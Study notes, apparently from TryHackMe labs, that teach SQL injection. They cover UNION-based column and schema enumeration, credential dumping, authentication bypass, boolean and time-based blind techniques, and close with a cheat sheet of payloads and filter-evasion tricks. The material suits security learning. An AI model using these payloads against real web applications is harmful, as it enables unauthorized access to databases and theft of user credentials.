# SQL Injection - Complete Notes

## Table of Contents
1. [SQL Injection Fundamentals](#sql-injection-fundamentals)
2. [In-Band SQL Injection](#in-band-sql-injection)
3. [Blind SQL Injection](#blind-sql-injection)
4. [Best Practices & Quick Reference](#best-practices--quick-reference)

---

## SQL Injection Fundamentals

### What is SQL Injection?
- **Definition**: SQLi causes malicious queries to be executed when a web application communicates with a database using improperly validated user input
- **Impact**: Attackers can steal, delete, or alter data; bypass authentication; compromise customer/private areas
- **History**: One of the oldest web application vulnerabilities
- **Key Point**: SQL syntax is NOT case-sensitive

### Database Basics
- **Database**: Electronic storage of organized data collections
- **DBMS**: Database Management System - controls the database
- **Types**: Relational and Non-Relational

---

## In-Band SQL Injection

### Detection Methods

#### 1. Initial Detection
**Check for query parameters in URL**: `?id=something`

**Test with special characters**:
```
id=1'  or  id=1"
```

**Vulnerable indicators**:
- SQL syntax error
- 500 Internal Server Error
- Completely different page

#### 2. Boolean Logic Testing
```
product.php?id=10' OR 1=1--
```
**Result**: If page displays all items or behaves differently, it's vulnerable

---

### Column Enumeration

#### Method 1: UNION SELECT (Trial & Error)
```sql
https://website.thm/article?id=1 UNION SELECT 1,2,3
```
- Keep adding numbers: `1,2,3,4,5...`
- When error disappears = that's the column count
- Example: At `1,2,3` no error → 3 columns exist

#### Method 2: ORDER BY (Direct Method)
```sql
https://website.thm/article?id=1 ORDER BY 3
```
- Increment number until error appears
- Error at 4 → 3 columns exist

---

### Key Concepts Explained

#### What does `SELECT 1,2,3` mean?
- **1, 2, 3 are dummy/constant values** (NOT column names)
- SQL allows selecting constants without tables
- Used to match the required number of columns for UNION

#### Why UNION requires same column count?
**CRITICAL UNION RULE**: Both queries joined by UNION must return the same number of columns

#### Example:
```sql
-- Original query returns 3 columns
SELECT title, author, date FROM articles WHERE id=1

-- Your injection must also have 3 columns
UNION SELECT 1,2,3
```

---

### Visible Columns

#### What are visible columns?
- Backend query returns multiple columns
- Webpage doesn't display all of them
- Only some columns render on screen

#### Testing for visibility:
```sql
id=0 UNION SELECT 'A','B','C'
```

**If page shows**:
```
B
C
```

**Then**:
- Column 1 → ❌ Hidden
- Column 2 → ✅ Visible
- Column 3 → ✅ Visible

---

### Data Extraction Strategy

#### Why place `database()` in specific positions?
Functions like `database()`, `user()`, `version()` must be placed in **visible columns**

```sql
0 UNION SELECT 1,2,database()
```
- Column 3 is visible
- `database()` output appears on page

#### Why keep filler values (1, 2)?
- SQL requires same number of columns
- Even unused columns must exist
- They act as: padding, fillers, column count stabilizers

---

### Important Functions

#### `group_concat()`
**Problem**: SQL returns multiple rows, but webpage shows only one value

**Solution**:
```sql
group_concat(column_name)
```

**Benefits**:
- Merges many rows into one string
- Makes enumeration possible via single output
- Separates values with commas by default

**Custom separator**:
```sql
group_concat(column_name SEPARATOR '|')
```

---

### Information Schema

#### What is `information_schema`?
- System database containing metadata
- Stores info about: databases, tables, columns

#### Usage:
- List all databases
- List tables in a database
- List columns in a table
- Understand DB structure before extracting data

---

### Complete Enumeration Flow

```
1. Find column count (UNION SELECT 1,2,3 or ORDER BY)
        ↓
2. Find visible columns (SELECT 'A','B','C')
        ↓
3. Find database name (database())
        ↓
4. List tables (information_schema.tables)
        ↓
5. List columns (information_schema.columns)
        ↓
6. Dump data (SELECT from target table)
```

---

### Practical Example Walkthrough

```sql
-- Step 1: Find columns
https://website.thm/article?id=1 UNION SELECT 1,2,3
-- Result: 3 columns

-- Step 2: Find visible columns
https://website.thm/article?id=0 UNION SELECT 'A','B','C'
-- Result: B and C visible (columns 2 & 3)

-- Step 3: Get database name
https://website.thm/article?id=0 UNION SELECT 1,2,database()
-- Result: Shows database name in column 3

-- Step 4: List tables
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables WHERE table_schema=database()
-- Result: users,articles,comments

-- Step 5: List columns from users table
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns WHERE table_name='users'
-- Result: id,username,password,email

-- Step 6: Extract data
https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password) 
FROM users
-- Result: admin:hash123,user1:hash456
```

---

### 🔑 Golden Rule
**UNION requires correct column count, and data must be placed ONLY in visible columns**

---

## Blind SQL Injection

### What is Blind SQLi?
- Little to no feedback to confirm if injection worked
- Error messages are disabled
- Injection still works, but responses are limited
- Must infer success through indirect indicators

---

### Authentication Bypass
- Simplest Blind SQLi technique
- Goal: Bypass login, not extract data
- Manipulate SQL logic to return true

**Example**:
```sql
' OR 1=1--
admin' OR '1'='1
```

---

### Boolean-Based Blind SQLi

#### Concept
- Response has only TWO outcomes: true/false, yes/no, 1/0
- Confirms if SQL injection payload was successful
- Despite limited response, can enumerate entire database

#### Example Scenario
**Website checks username availability**:
- URL: `https://website.thm/checkuser?username=admin`
- Response: `{"taken":true}` or `{"taken":false}`

**Backend query**:
```sql
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```

---

### Boolean-Based Attack Methodology

#### 1️⃣ Find Number of Columns
```sql
admin123' UNION SELECT 1,2,3;--
```
- Keep adding numbers until `taken` becomes `true`
- Result: 3 columns

#### 2️⃣ Find Database Name (Character by character)
```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
```

**Process**:
- Try: `a%`, `b%`, `c%`... until `true`
- If `s%` is true → try: `sa%`, `sb%`, `sc%`...
- If `sq%` is true → try: `sqa%`, `sqb%`, `sqc%`...
- Continue until complete: `sqli_three`

#### 3️⃣ Find Table Names
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables 
WHERE table_schema = 'sqli_three' AND table_name LIKE 'u%';--
```
or
```sql
admin123' UNION SELECT 1,2,table_name FROM information_schema.tables 
```

- Result: `users` table exists

#### 4️⃣ Find Column Names
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS 
WHERE TABLE_SCHEMA='sqli_three' 
AND TABLE_NAME='users' 
AND COLUMN_NAME LIKE 'i%';--
```
- Test each letter: `i%`, `u%`, `p%`
- Result: `id`, `username`, `password` columns

#### 5️⃣ Extract Username
```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%'
```
- Character by character enumeration
- Result: `admin`

#### 6️⃣ Extract Password
```sql
admin123' UNION SELECT 1,2,3 FROM users 
WHERE username='admin' AND password LIKE '3%'
```
- Character by character enumeration
- Result: `3845`

---

### Time-Based Blind SQLi

#### Concept
- No visual indicator of success/failure
- Success indicated by **time delay** in response
- Uses `SLEEP(x)` function alongside UNION

#### How it works
```sql
admin' UNION SELECT SLEEP(5),2,3;--
```
- `SLEEP()` executes only on successful UNION SELECT
- If page takes 5+ seconds → injection successful
- If immediate response → injection failed

#### Why use Time-Based?
- When Boolean-based doesn't work
- When application gives same response for all queries
- When error messages are completely suppressed

---

### Column Name Extraction Deep Dive

#### Understanding `group_concat()` with Column Names

**Payload**:
```sql
/about/0 UNION ALL SELECT 
  group_concat(column_name),
  null,
  null,
  null,
  null
FROM information_schema.columns 
WHERE table_name="people"
```

#### Breaking Down Each Part

**1. `UNION ALL SELECT`**
- Injects second SELECT into original query
- Result displays in the response

**2. `group_concat(column_name)`**
- `information_schema.columns` = metadata about all tables & columns
- `column_name` = name of each column
- `group_concat()` = merges ALL column names into ONE string

**Example Output**:
```
id,name,email,password,role,created_at
```

**3. `null, null, null, null`** (Padding)
- Original query likely selects 5 columns
- UNION requires same number of columns
- Structure:
  - 1 real column → `group_concat(column_name)`
  - 4 fillers → `null`

---

#### Important Clarifications

**Q: Why not just 5 column names?**
- Number of SELECT columns ≠ number of values inside a column
- `group_concat()` collapses unlimited rows into single field

**Visual**:
```
1 column
└── contains: col1,col2,col3,col4,col5,col6,col7,...
```

**Q: What returns one column name per row?**
```sql
UNION SELECT column_name,null,null,null,null
FROM information_schema.columns
WHERE table_name="people"
```

**Why attackers prefer `group_concat()`?**
- Many apps show only one row
- Apps may truncate output
- Single string easier to extract

---

#### Pro Tips

**Better separator for parsing**:
```sql
group_concat(column_name SEPARATOR '|')
```

**Benefits**:
- Bypasses filters
- Easier parsing
- Clear visual separation

---

### Summary: In-Band vs Blind SQLi

| Feature | In-Band | Blind |
|---------|---------|-------|
| **Error Messages** | Visible | Hidden |
| **Feedback** | Direct | Indirect |
| **Speed** | Fast | Slow |
| **Techniques** | UNION, Error-based | Boolean, Time-based |
| **Difficulty** | Easier | Harder |

---

## Best Practices & Quick Reference

### Best Practices
- ✅ Always test for column count first
- ✅ Identify visible columns before data extraction
- ✅ Use `group_concat()` for efficient enumeration
- ✅ Character-by-character enumeration for blind SQLi
- ✅ URL encode payloads when necessary
- ✅ Use `information_schema` for database mapping

---

### Quick Reference Commands

#### Detection Payloads
```sql
-- Basic detection
id=1'
id=1"
id=1' OR 1=1--
```

#### Column Enumeration
```sql
-- UNION method
UNION SELECT 1,2,3

-- ORDER BY method
ORDER BY 3
```

#### Database Enumeration
```sql
-- Get database name
0 UNION SELECT 1,2,database()

-- Get version
0 UNION SELECT 1,2,version()

-- Get user
0 UNION SELECT 1,2,user()
```

#### Table Enumeration
```sql
-- List all tables in current database
0 UNION SELECT 1,2,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema=database()
```

#### Column Enumeration
```sql
-- List all columns in a table
0 UNION SELECT 1,2,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name='users'
```

#### Data Extraction
```sql
-- Extract username and password
0 UNION SELECT 1,2,group_concat(username,':',password) 
FROM users

-- Extract with custom separator
0 UNION SELECT 1,2,group_concat(username,'|',password SEPARATOR '; ') 
FROM users
```

#### Blind SQLi - Boolean-Based
```sql
-- Test true condition
' AND 1=1--

-- Test false condition
' AND 1=2--

-- Database name enumeration
' AND database() LIKE 'a%'--
' AND SUBSTRING(database(),1,1)='a'--

-- Table name enumeration
' AND (SELECT COUNT(*) FROM information_schema.tables 
WHERE table_schema=database() AND table_name LIKE 'u%')=1--
```

#### Blind SQLi - Time-Based
```sql
-- Basic time delay
' AND SLEEP(5)--

-- Conditional time delay
' AND IF(1=1,SLEEP(5),0)--

-- UNION with sleep
' UNION SELECT SLEEP(5),2,3--

-- Database name with time delay
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
```

#### Advanced Techniques
```sql
-- Extract multiple columns at once
0 UNION SELECT 1,2,group_concat(id,'::',username,'::',email,'::',password)
FROM users

-- Limit results
0 UNION SELECT 1,2,password FROM users LIMIT 0,1

-- Using CONCAT instead of group_concat
0 UNION SELECT 1,2,CONCAT(username,':',password) FROM users LIMIT 0,1
```

#### Common SQL Injection Bypasses
```sql
-- Comment styles
--
#
/* */
;%00

-- Space alternatives
/**/
%20
%09 (tab)
%0a (newline)

-- String concatenation
'ad'+'min'
'ad'||'min'
CONCAT('ad','min')

-- Case manipulation
SeLeCt
uNiOn
```

---
